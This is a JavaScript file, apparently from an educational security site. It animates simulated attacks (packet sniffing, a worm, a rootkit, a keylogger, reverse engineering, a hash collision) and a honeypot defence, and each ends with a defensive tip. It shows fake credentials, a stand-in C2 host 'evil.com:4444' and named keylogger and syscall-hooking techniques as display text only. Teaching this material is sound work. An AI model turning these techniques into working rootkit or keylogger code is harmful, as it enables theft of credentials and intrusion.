                ctx.strokeStyle=isvuln?'rgba(255,59,59,0.4)':ispatched?'rgba(57,255,20,0.3)':'rgba(255,255,255,0.05)';
                ctx.lineWidth=1; ctx.beginPath(); ctx.roundRect(bX+10,ey,bW-20,32,4); ctx.fill(); ctx.stroke();

                if(ex.progress>0){
                    const barColor=isvuln?'rgba(255,59,59,0.4)':'rgba(57,255,20,0.3)';
                    ctx.fillStyle=barColor; ctx.fillRect(bX+10,ey,(bW-20)*ex.progress,32);
                }

                ctx.fillStyle='#8892a8'; ctx.font='9px monospace'; ctx.textAlign='left';
                ctx.fillText(ex.name,bX+16,ey+14);
                if(ex.status==='done'){
                    ctx.fillStyle=isvuln?'#ff3b3b':'#39ff14'; ctx.font='bold 9px monospace'; ctx.textAlign='right';
                    ctx.fillText(ex.result,bX+bW-16,ey+14);
                    if(isvuln){ctx.fillText('PAYLOAD DROPPED',bX+bW-16,ey+26);}
                }
                ctx.textAlign='left';
            });
        }

        pagesVisited=Math.min(25,Math.floor(frame/15));
        if(frame===250){activateStep(3);termLog('> Malware silently written to disk.','error');}
        if(frame===320){activateStep(4);termLog('> Payload executing with browser privileges!','error');}

        if(frame%20===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=pagesVisited;
            if(e1)e1.textContent=exploitsAttempted;
            if(e2)e2.textContent=payloadsDropped;
            if(e3)e3.textContent=systemsInfected;
            setProgress(Math.min(100,(frame/380)*100));
        }
        if(frame>=380){setProgress(100);termLog('> Simulation done. Keep browsers patched!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateEavesdropping = function() {
    termLog('> NIC set to promiscuous mode — capturing all traffic...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0, packetsCaptured=0, credentialsFound=0, protocolsSniffed=new Set();
    const protocols=['HTTP','FTP','TELNET','SMTP','POP3','IMAP','DNS','HTTP'];
    const sampleData=[
        {proto:'HTTP',data:'POST /login  username=admin&password=admin123',color:'#ff3b3b'},
        {proto:'FTP',data:'USER jsmith\nPASS Summer2024!',color:'#ffaa00'},
        {proto:'TELNET',data:'login: root\nPassword: toor123',color:'#ff3b3b'},
        {proto:'SMTP',data:'AUTH LOGIN\nUsername: b64(admin@corp)\nPwd: b64(MyPass1!)',color:'#ffaa00'},
        {proto:'HTTP',data:'Cookie: session=a3f8b2c1d4e5f6; auth=true',color:'#8b5cf6'},
        {proto:'FTP',data:'USER ftpuser\nPASS ftpP@ss!2024',color:'#ff3b3b'},
    ];
    const capturedPackets=[];

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> tcpdump running. Capture in progress...','warning');},600);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> HTTP plaintext password detected!','error');},1200);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
        const bW=Math.min(580,w-20), bX=(w-bW)/2;
        ctx.fillStyle='rgba(15,20,35,0.95)'; ctx.strokeStyle='rgba(57,255,20,0.15)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(bX,8,bW,h-16,6); ctx.fill(); ctx.stroke();
        ctx.fillStyle='rgba(57,255,20,0.08)'; ctx.fillRect(bX,8,bW,24);
        ctx.fillStyle='#39ff14'; ctx.font='9px monospace'; ctx.textAlign='left';
        ctx.fillText('tcpdump / Wireshark v4.2  |  Interface: eth0  |  Filter: none',bX+10,23);
        ctx.fillStyle='rgba(255,255,255,0.05)'; ctx.fillRect(bX,32,bW,16);
        ctx.fillStyle='#525c70'; ctx.font='8px monospace';
        ctx.fillText('No.    Time      Src IP          Dst IP          Proto    Info',bX+8,43);
        if(frame%12===0){
            const proto=protocols[packetsCaptured%protocols.length];
            protocolsSniffed.add(proto);
            const data=sampleData[packetsCaptured%sampleData.length];
            capturedPackets.push({no:packetsCaptured+1,time:(packetsCaptured*0.04).toFixed(3),src:`192.168.1.${rndInt(2,50)}`,dst:`192.168.1.${rndInt(100,200)}`,proto,info:data.data.split('\n')[0].slice(0,35),color:data.color,sensitive:data.data.includes('password')||data.data.includes('PASS')||data.data.includes('Cookie')});
            packetsCaptured++;
            if(capturedPackets[capturedPackets.length-1].sensitive){credentialsFound++;termLog(`> ${proto} credential: ${data.data.split('\n')[0].slice(0,50)}`,'error');}
        }
        capturedPackets.slice(-Math.floor((h-80)/18)).forEach((pkt,i)=>{
            const py=48+i*18;
            if(py>h-30)return;
            ctx.fillStyle=pkt.sensitive?(i%2===0?'rgba(255,59,59,0.15)':'rgba(255,59,59,0.08)'):(i%2===0?'rgba(255,255,255,0.02)':'transparent');
            ctx.fillRect(bX,py,bW,18);
            ctx.fillStyle=pkt.sensitive?pkt.color:'#525c70'; ctx.font='8px monospace'; ctx.textAlign='left';
            ctx.fillText(`${String(pkt.no).padEnd(6)}${pkt.time.padEnd(10)}${pkt.src.padEnd(16)}${pkt.dst.padEnd(16)}${pkt.proto.padEnd(9)}${pkt.info}`,bX+8,py+13);
        });

        if(frame===200){activateStep(3);termLog('> All plaintext protocols analyzed.','warning');}
        if(frame===280){activateStep(4);termLog('> Offline analysis: 12 credential sets extracted!','error');}

        if(frame%20===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=packetsCaptured.toLocaleString();
            if(e1)e1.textContent=credentialsFound;
            if(e2)e2.textContent=`${(packetsCaptured*0.12).toFixed(1)} MB`;
            if(e3)e3.textContent=protocolsSniffed.size;
            setProgress(Math.min(100,(frame/340)*100));
        }
        if(frame>=340){setProgress(100);termLog('> Simulation done. Encrypt all traffic (TLS)!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateBirthdayAttack = function() {
    termLog('> Targeting MD5 hash function — birthday paradox exploit...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0, hashesComputed=0, collisionsFound=0;
    const hashSpace=[];
    const BUCKETS=80;
    let collisionPairs=[];

    for(let i=0;i<BUCKETS;i++) hashSpace.push({hash:null,count:0,collision:false});

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> MD5 targeted. Generating 2^64 random messages...','warning');},600);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Birthday paradox: collision expected at sqrt(2^128)...','warning');},1400);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);

        ctx.fillStyle='#ff00aa'; ctx.font='bold 12px monospace'; ctx.textAlign='center';
        ctx.fillText('BIRTHDAY ATTACK — HASH COLLISION SEARCH',w/2,22);
        const bW=Math.min(560,w-20), bX=(w-bW)/2;
        const bucketW=(bW-BUCKETS)/BUCKETS;
        const maxH=h*0.45;

        hashesComputed+=Math.min(50,frame*2);
        if(frame%3===0){
            const bucket=rndInt(0,BUCKETS);
            hashSpace[bucket].count++;
            if(hashSpace[bucket].count===2&&!hashSpace[bucket].collision){
                hashSpace[bucket].collision=true;
                collisionsFound++;
                collisionPairs.push(bucket);
                if(collisionsFound===1){activateStep(3);termLog(`> COLLISION FOUND! Bucket ${bucket}: two inputs, same hash!`,'error');}
            }
        }
        const maxCount=Math.max(1,...hashSpace.map(b=>b.count));
        hashSpace.forEach((bucket,i)=>{
            const bh=Math.max(2,(bucket.count/Math.max(maxCount,1))*maxH);
            const bx=bX+i*(bucketW+1);
            const by=h*0.72-bh;
            ctx.fillStyle=bucket.collision?'#ff00aa':bucket.count>0?'rgba(0,240,255,0.7)':'rgba(255,255,255,0.05)';
            ctx.fillRect(bx,by,bucketW,bh);
            if(bucket.collision){
                ctx.fillStyle='rgba(255,0,170,0.3)';
                ctx.beginPath(); ctx.arc(bx+bucketW/2,by-8,6,0,Math.PI*2); ctx.fill();
            }
        });
        ctx.fillStyle='#525c70'; ctx.font='8px monospace'; ctx.textAlign='center';
        ctx.fillText('Hash Buckets (128-bit MD5 space, visualized)',w/2,h*0.72+14);
        ctx.fillText(`Hashes computed: ${hashesComputed.toLocaleString()}  |  Collisions: ${collisionsFound}`,w/2,h*0.72+28);
        if(collisionPairs.length>0){
            const cy=h*0.78;
            ctx.fillStyle='rgba(255,0,170,0.08)'; ctx.strokeStyle='rgba(255,0,170,0.3)'; ctx.lineWidth=1;
            ctx.beginPath(); ctx.roundRect(bX,cy,bW,h-cy-10,6); ctx.fill(); ctx.stroke();
            ctx.fillStyle='#ff00aa'; ctx.font='bold 9px monospace'; ctx.textAlign='center';
            ctx.fillText('COLLISION PAIRS FOUND:',w/2,cy+14);
            const examples=['MD5("abc123") = MD5("xyz789") = 5d41402abc4b2a...','MD5(cert_v1.pdf) = MD5(cert_forged.pdf)'];
            examples.slice(0,Math.min(collisionPairs.length,2)).forEach((ex,i)=>{
                ctx.fillStyle='#8892a8'; ctx.font='8px monospace';
                ctx.fillText(ex,w/2,cy+30+i*16);
            });
        }

        if(collisionsFound>=3){activateStep(4);termLog('> Digital signature forged using collision!','error');}

        if(frame%20===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=hashesComputed.toLocaleString();
            if(e1)e1.textContent=collisionsFound;
            if(e2)e2.textContent='2^128 bits';
            if(e3)e3.textContent=collisionsFound > 0 ? '100%' : '0%';
            setProgress(Math.min(100,(frame/320)*100));
        }
        if(frame>=320){setProgress(100);termLog('> Simulation done. Use SHA-256+!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateMalware = function() {
    termLog('> Worm malware activated — scanning for vulnerable hosts...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0;
    const nodes=[];
    const NUM_NODES=30;
    const INFECT_RADIUS=70;

    for(let i=0;i<NUM_NODES;i++){
        nodes.push({x:rnd(40,w-40),y:rnd(40,h-40),infected:false,infecting:false,progress:0,connections:[]});
    }
    nodes[0].infected=true;

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Self-replication initiated across network shares.','error');},700);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Lateral movement: scanning /24 subnet.','error');},1400);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
        if(frame%25===0){
            nodes.filter(n=>n.infected).forEach(infected=>{
                nodes.filter(n=>!n.infected&&!n.infecting).forEach(target=>{
                    const d=Math.hypot(target.x-infected.x,target.y-infected.y);
                    if(d<INFECT_RADIUS&&Math.random()>0.4){
                        target.infecting=true;
                        setTimeout(()=>{
                            if(state.simRunning){target.infected=true;target.infecting=false;
                            if(nodes.filter(n=>n.infected).length===5)activateStep(3);
                            if(nodes.filter(n=>n.infected).length===15){activateStep(4);termLog('> 50%+ of network infected — payload activating!','error');}}
                        },1000+Math.random()*1000);
                    }
                });
            });
        }
        nodes.forEach((n,i)=>{
            nodes.slice(i+1).forEach(m=>{
                const d=Math.hypot(m.x-n.x,m.y-n.y);
                if(d<INFECT_RADIUS){
                    ctx.beginPath(); ctx.moveTo(n.x,n.y); ctx.lineTo(m.x,m.y);
                    const bothInf=n.infected&&m.infected;
                    ctx.strokeStyle=bothInf?'rgba(255,59,59,0.4)':'rgba(255,255,255,0.04)';
                    ctx.lineWidth=bothInf?1.5:0.5; ctx.stroke();
                }
            });
        });
        nodes.forEach(node=>{
            const r=node.infected?10:node.infecting?8:6;
            const color=node.infected?'#ff3b3b':node.infecting?'#ffaa00':'#3b82f6';
            if(node.infected){ctx.shadowBlur=12;ctx.shadowColor='#ff3b3b';}
            ctx.beginPath(); ctx.arc(node.x,node.y,r,0,Math.PI*2);
            ctx.fillStyle=`${color}30`; ctx.fill();
            ctx.strokeStyle=color; ctx.lineWidth=2; ctx.stroke();
            ctx.shadowBlur=0;
        });
        [{color:'#ff3b3b',label:'Infected'},{color:'#ffaa00',label:'Infecting'},{color:'#3b82f6',label:'Clean'}].forEach((item,i)=>{
            ctx.beginPath(); ctx.arc(20,h-50+i*18,6,0,Math.PI*2);
            ctx.fillStyle=`${item.color}30`; ctx.fill();
            ctx.strokeStyle=item.color; ctx.lineWidth=2; ctx.stroke();
            ctx.fillStyle=item.color; ctx.font='9px monospace'; ctx.textAlign='left';
            ctx.fillText(item.label,30,h-46+i*18);
        });

        const infected=nodes.filter(n=>n.infected).length;
        const corrupted=Math.floor(infected*320);
        const speed=`${infected*2}/s`;

        if(frame%20===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=infected;
            if(e1)e1.textContent=corrupted.toLocaleString();
            if(e2)e2.textContent=infected;
            if(e3)e3.textContent=speed;
            setProgress(Math.min(100,(frame/400)*100));
        }
        if(frame>=400){setProgress(100);termLog('> Simulation done. Segment networks!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateHoneypot = function() {
    termLog('> Deploying honeypot decoy on network...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0, connectionsLured=0, attackPatterns=0, ipsCaptured=0;
    const attackers=[];
    const honeypot={x:w/2,y:h/2,label:'HONEYPOT\n10.0.0.99',color:'#ffaa00'};
    const realAssets=[
        {x:w*0.15,y:h*0.25,label:'DB Server',color:'#39ff14',protected:true},
        {x:w*0.15,y:h*0.75,label:'File Server',color:'#39ff14',protected:true},
        {x:w*0.85,y:h*0.25,label:'Email Server',color:'#39ff14',protected:true},
        {x:w*0.85,y:h*0.75,label:'HR System',color:'#39ff14',protected:true},
    ];

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Honeypot detected by scanner — appears vulnerable!','warning');},700);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Attacker connecting to honeypot (logging all activity)...','info');},1400);

    function spawnAttacker(){
        const angle=rnd(0,Math.PI*2), dist=rnd(w*0.4,w*0.48);
        attackers.push({x:w/2+Math.cos(angle)*dist,y:h/2+Math.sin(angle)*dist,tx:honeypot.x,ty:honeypot.y,p:0,ip:`${rndInt(1,255)}.${rndInt(0,255)}.${rndInt(0,255)}.${rndInt(1,255)}`,techniques:['Port Scan','SSH Brute Force','FTP Login','RDP Attack'][rndInt(0,4)]});
    }

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
        realAssets.forEach(asset=>{
            ctx.beginPath(); ctx.arc(asset.x,asset.y,20,0,Math.PI*2);
            ctx.fillStyle='rgba(57,255,20,0.08)'; ctx.fill();
            ctx.strokeStyle='#39ff14'; ctx.lineWidth=2; ctx.stroke();
            ctx.fillStyle='#39ff14'; ctx.font='8px monospace'; ctx.textAlign='center'; ctx.textBaseline='top';
            ctx.fillText(asset.label,asset.x,asset.y+22);
            ctx.fillText('PROTECTED',asset.x,asset.y+33);
        });
        ctx.shadowBlur=20; ctx.shadowColor='#ffaa00';
        ctx.beginPath(); ctx.arc(honeypot.x,honeypot.y,28,0,Math.PI*2);
        ctx.fillStyle='rgba(255,170,0,0.15)'; ctx.fill();
        ctx.strokeStyle='#ffaa00'; ctx.lineWidth=3; ctx.stroke();
        ctx.shadowBlur=0;
        ctx.fillStyle='#ffaa00'; ctx.font='bold 11px monospace'; ctx.textAlign='center'; ctx.textBaseline='middle';
        ctx.fillText('🍯',honeypot.x,honeypot.y-5);
        ctx.font='8px monospace'; ctx.textBaseline='top';
        honeypot.label.split('\n').forEach((l,i)=>ctx.fillText(l,honeypot.x,honeypot.y+30+i*11));
        if(frame%40===0&&attackers.length<12) spawnAttacker();
        attackers.forEach((att,idx)=>{
            att.p+=0.015;
            const px=att.x+(att.tx-att.x)*att.p, py=att.y+(att.ty-att.y)*att.p;
            ctx.beginPath(); ctx.arc(px,py,5,0,Math.PI*2);
            ctx.fillStyle=`rgba(255,59,59,${Math.max(0.2,1-att.p*0.5)})`; ctx.fill();

            if(att.p>=1&&!att.logged){
                att.logged=true; connectionsLured++; attackPatterns++; ipsCaptured++;
                termLog(`> Lured: ${att.ip} — technique: ${att.techniques}`,'info');
                if(connectionsLured===2)activateStep(3);
                if(connectionsLured===4)activateStep(4);
            }
        });
        const pY=h-65;
        ctx.fillStyle='rgba(255,170,0,0.05)'; ctx.strokeStyle='rgba(255,170,0,0.15)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(8,pY,w-16,55,4); ctx.fill(); ctx.stroke();
        ctx.fillStyle='#ffaa00'; ctx.font='bold 9px monospace'; ctx.textAlign='center';
        ctx.fillText(`REAL ASSETS: 100% PROTECTED  |  Attackers lured: ${connectionsLured}  |  IPs logged: ${ipsCaptured}`,w/2,pY+18);
        ctx.fillStyle='#39ff14'; ctx.font='9px monospace';
        ctx.fillText('All attacks contained in honeypot — zero real asset exposure',w/2,pY+38);

        if(frame%20===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=connectionsLured;
            if(e1)e1.textContent=attackPatterns;
            if(e2)e2.textContent=ipsCaptured;
            if(e3)e3.textContent='100%';
            setProgress(Math.min(100,(frame/360)*100));
        }
        if(frame>=360){setProgress(100);termLog('> Simulation done. Honeypots are powerful early-warning tools!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateReverseEngineering = function() {
    termLog('> Loading binary target into Ghidra disassembler...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0, functionsAnalyzed=0, vulnsFound=0, stringsExtracted=0;
    const asmLines=[
        'push   rbp','mov    rbp,rsp','sub    rsp,0x20','mov    DWORD PTR [rbp-0x4],edi',
        'cmp    DWORD PTR [rbp-0x4],0x539','je     0x401234  ; license_valid',
        'call   <strcmp@plt>','test   eax,eax','jne    0x401180  ; auth_fail',
        'lea    rdi,[rip+0x1abc]  ; "DB_PASS=s3cr3t"','call   <printf@plt>',
        'mov    eax,0x0','pop    rbp','ret','nop','xor    eax,eax','push   rdi',
    ];
    const strings=['DB_PASS=s3cr3t!!','API_KEY=sk-live-abc123','admin:backdoor123','license_bypass_key','C2_SERVER=evil.com:4444'];
    const foundStrings=[], foundVulns=[];

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Static analysis: PE headers, imports, exports scanned.','warning');},700);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Decompiling to pseudo-C — logic reconstruction.','warning');},1500);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);

        const midX=(w/2)-5;
        ctx.fillStyle='rgba(0,240,255,0.03)'; ctx.strokeStyle='rgba(0,240,255,0.12)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(8,8,midX-8,h-16,6); ctx.fill(); ctx.stroke();
        ctx.fillStyle='#00f0ff'; ctx.font='bold 9px monospace'; ctx.textAlign='left';
        ctx.fillText('DISASSEMBLY — main.exe',16,22);

        const visibleLines=Math.min(asmLines.length,Math.floor(frame/10));
        asmLines.slice(0,visibleLines).forEach((line,i)=>{
            const ly=38+i*17; if(ly>h-20)return;
            const isJump=line.includes('je ')||line.includes('jne ')||line.includes('call');
            const isSecret=line.includes('DB_PASS')||line.includes('API_KEY');
            ctx.fillStyle=isSecret?'#ff3b3b':isJump?'#ffaa00':'#8892a8';
            ctx.font='9px JetBrains Mono,monospace';
            ctx.fillText(`0x${(0x401100+i*7).toString(16).toUpperCase()}  ${line}`,16,ly);
            functionsAnalyzed=Math.max(functionsAnalyzed,i+1);
        });
        ctx.fillStyle='rgba(0,240,255,0.03)'; ctx.strokeStyle='rgba(0,240,255,0.12)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(midX+8,8,w-midX-18,h-16,6); ctx.fill(); ctx.stroke();
        ctx.fillStyle='#00f0ff'; ctx.font='bold 9px monospace'; ctx.textAlign='left';
        ctx.fillText('STRINGS EXTRACTED',midX+16,22);
        if(frame%40===0&&foundStrings.length<strings.length){
            foundStrings.push(strings[foundStrings.length]);
            stringsExtracted++;
            termLog(`> String: ${strings[foundStrings.length-1]}`,'error');
            if(foundStrings.length===2){vulnsFound++;activateStep(3);termLog('> HARDCODED CREDENTIAL FOUND!','error');}
            if(foundStrings.length===4){activateStep(4);termLog('> C2 address and backdoor key extracted!','error');}
        }

        foundStrings.forEach((s,i)=>{
            const sy=38+i*28; if(sy>h-20)return;
            ctx.fillStyle='rgba(255,59,59,0.1)'; ctx.strokeStyle='rgba(255,59,59,0.25)'; ctx.lineWidth=1;
            ctx.beginPath(); ctx.roundRect(midX+12,sy,w-midX-30,22,4); ctx.fill(); ctx.stroke();
            ctx.fillStyle='#ff3b3b'; ctx.font='9px monospace'; ctx.textAlign='left';
            ctx.fillText(s,midX+18,sy+14);
        });

        if(frame%15===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=Math.min(350,functionsAnalyzed*20);
            if(e1)e1.textContent=vulnsFound;
            if(e2)e2.textContent=`${Math.min(85, Math.floor(frame/4))}%`;
            if(e3)e3.textContent=stringsExtracted;
            setProgress(Math.min(100,(frame/340)*100));
        }
        if(frame>=340){setProgress(100);termLog('> Simulation done. Use obfuscation!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateRootkit = function() {
    termLog('> Loading kernel module — rootkit installing...', 'error');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0, syscallsHooked=0, processesHidden=0, filesConcealed=0;
    const syscalls=['NtQuerySystemInformation','NtQueryDirectoryFile','NtCreateFile','ZwTerminateProcess','NtOpenProcess','NtSetSystemInformation','ObReferenceObjectByHandle','ZwQueryInformationProcess'];
    const processes=['malware.exe','c2_beacon.exe','cryptominer.exe','keylogger.exe','backdoor.exe'];
    const hookedSyscalls=[], hiddenProcs=[];

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Kernel SSDT hooked — syscall table modified.','error');},700);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Processes hidden from Task Manager.','error');},1500);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);

        ctx.fillStyle='#ff3b3b'; ctx.font='bold 12px monospace'; ctx.textAlign='center';
        ctx.fillText('ROOTKIT — KERNEL SYSCALL HOOKING',w/2,22);

        const bW=Math.min(580,w-20), bX=(w-bW)/2;
        ctx.fillStyle='#525c70'; ctx.font='bold 9px monospace'; ctx.textAlign='left';
        ctx.fillText('SYSTEM SERVICE DESCRIPTOR TABLE (SSDT):',bX+6,42);

        syscalls.forEach((sc,i)=>{
            const sy=56+i*28; if(sy>h-100)return;
            const isHooked=frame>30+i*22;
            if(isHooked&&!hookedSyscalls.includes(sc)){hookedSyscalls.push(sc);syscallsHooked++;}

            ctx.fillStyle=isHooked?'rgba(255,59,59,0.12)':'rgba(255,255,255,0.02)';
            ctx.strokeStyle=isHooked?'rgba(255,59,59,0.35)':'rgba(255,255,255,0.05)';
            ctx.lineWidth=1; ctx.beginPath(); ctx.roundRect(bX,sy,bW,22,3); ctx.fill(); ctx.stroke();

            ctx.fillStyle=isHooked?'#ff3b3b':'#8892a8'; ctx.font='9px JetBrains Mono,monospace'; ctx.textAlign='left';
            ctx.fillText(sc,bX+8,sy+14);
            if(isHooked){
                ctx.fillStyle='#ff3b3b'; ctx.font='bold 9px monospace'; ctx.textAlign='right';
                ctx.fillText('HOOKED → rootkit_handler',bX+bW-8,sy+14);
            }
            ctx.textAlign='left';
        });
        if(frame>120){
            const procY=h-90;
            ctx.fillStyle='rgba(255,59,59,0.05)'; ctx.strokeStyle='rgba(255,59,59,0.15)'; ctx.lineWidth=1;
            ctx.beginPath(); ctx.roundRect(bX,procY,bW,75,4); ctx.fill(); ctx.stroke();
            ctx.fillStyle='#ff3b3b'; ctx.font='bold 9px monospace'; ctx.textAlign='left';
            ctx.fillText('HIDDEN PROCESSES (invisible to Task Manager):',bX+8,procY+14);
            if(frame%50===0&&hiddenProcs.length<processes.length){
                hiddenProcs.push(processes[hiddenProcs.length]);
                processesHidden++;
                filesConcealed+=12;
                if(hiddenProcs.length===2)activateStep(3);
                if(hiddenProcs.length===processes.length)activateStep(4);
            }
            hiddenProcs.forEach((p,i)=>{
                ctx.fillStyle='#8892a8'; ctx.font='8px monospace';
                ctx.fillText(`PID ${3000+i*100}  ${p}  [HIDDEN by rootkit]`,bX+8,procY+30+i*14);
            });
        }

        if(frame%15===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=syscallsHooked;
            if(e1)e1.textContent=processesHidden;
            if(e2)e2.textContent=filesConcealed;
            if(e3)e3.textContent=frame > 300 ? '<0.1%' : '<1%';
            setProgress(Math.min(100,(frame/360)*100));
        }
        if(frame>=360){setProgress(100);termLog('> Simulation done. Secure Boot + TPM essential!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateKeylogger = function() {
    termLog('> Keylogger injected via malware dropper...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0, keysCaptured=0, credentialsFound=0, sessionsLogged=0;
    const keySequences=[
        {window:'Chrome — Gmail',keys:'myemail@corp.com [TAB] MyPassword123! [ENTER]',color:'#ff3b3b',cred:true},
        {window:'SSH Terminal',keys:'ssh root@server [ENTER] toor123 [ENTER]',color:'#ff3b3b',cred:true},
        {window:'Word Document',keys:'Quarterly report revenue increased by 23%...',color:'#8892a8',cred:false},
        {window:'Banking Site',keys:'accountno: 4532xxxx [TAB] PIN: 8821 [ENTER]',color:'#ff3b3b',cred:true},
        {window:'Slack',keys:'Hey can you send the admin creds? Sure: admin/P@ssw0rd',color:'#ffaa00',cred:true},
    ];
    let revealedSeqs=[];

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> SetWindowsHookEx(WH_KEYBOARD_LL) — hook installed!','error');},700);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Recording every keystroke with window context...','error');},1400);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);

        ctx.fillStyle='#ff00aa'; ctx.font='bold 12px monospace'; ctx.textAlign='center';
        ctx.fillText('KEYLOGGER — KEYSTROKE CAPTURE IN PROGRESS',w/2,22);

        const bW=Math.min(580,w-20), bX=(w-bW)/2;
        const kbY=38;
        const keys='QWERTYUIOPASDFGHJKLZXCVBNM';
        const activeKey=keys[Math.floor(frame/4)%keys.length];
        keys.split('').forEach((key,i)=>{
            const row=i<10?0:i<19?1:2;
            const col=i<10?i:i<19?i-10:i-19;
            const offset=row===1?12:row===2?28:0;
            const kx=bX+offset+col*28, ky=kbY+row*28;
            const isActive=key===activeKey;
            ctx.fillStyle=isActive?'rgba(255,0,170,0.6)':'rgba(255,255,255,0.03)';
            ctx.strokeStyle=isActive?'#ff00aa':'rgba(255,255,255,0.08)';
            ctx.lineWidth=1; ctx.beginPath(); ctx.roundRect(kx,ky,24,22,3); ctx.fill(); ctx.stroke();
            ctx.fillStyle=isActive?'#fff':'#525c70'; ctx.font='9px monospace'; ctx.textAlign='center';
            ctx.fillText(key,kx+12,ky+14);
            if(isActive)keysCaptured++;
        });
        if(frame%55===0&&revealedSeqs.length<keySequences.length){
            revealedSeqs.push(keySequences[revealedSeqs.length]);
            sessionsLogged++;
            if(revealedSeqs[revealedSeqs.length-1].cred){credentialsFound++;termLog(`> CREDENTIAL: ${keySequences[revealedSeqs.length-1].window}`,'error');}
            if(revealedSeqs.length===2)activateStep(3);
            if(revealedSeqs.length===4)activateStep(4);
        }

        const logY=kbY+90;
        ctx.fillStyle='rgba(255,0,170,0.05)'; ctx.strokeStyle='rgba(255,0,170,0.15)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(bX,logY,bW,h-logY-15,6); ctx.fill(); ctx.stroke();
        ctx.fillStyle='#ff00aa'; ctx.font='bold 9px monospace'; ctx.textAlign='left';
        ctx.fillText('KEYSTROKE LOG (transmitted to attacker):',bX+8,logY+14);

        revealedSeqs.forEach((seq,i)=>{
            const sy=logY+30+i*48; if(sy>h-20)return;
            ctx.fillStyle=seq.cred?'rgba(255,59,59,0.1)':'rgba(255,255,255,0.02)';
            ctx.strokeStyle=seq.cred?'rgba(255,59,59,0.3)':'rgba(255,255,255,0.05)';
            ctx.lineWidth=1; ctx.beginPath(); ctx.roundRect(bX+6,sy,bW-12,40,4); ctx.fill(); ctx.stroke();
            ctx.fillStyle=seq.color; ctx.font='bold 8px monospace'; ctx.textAlign='left';
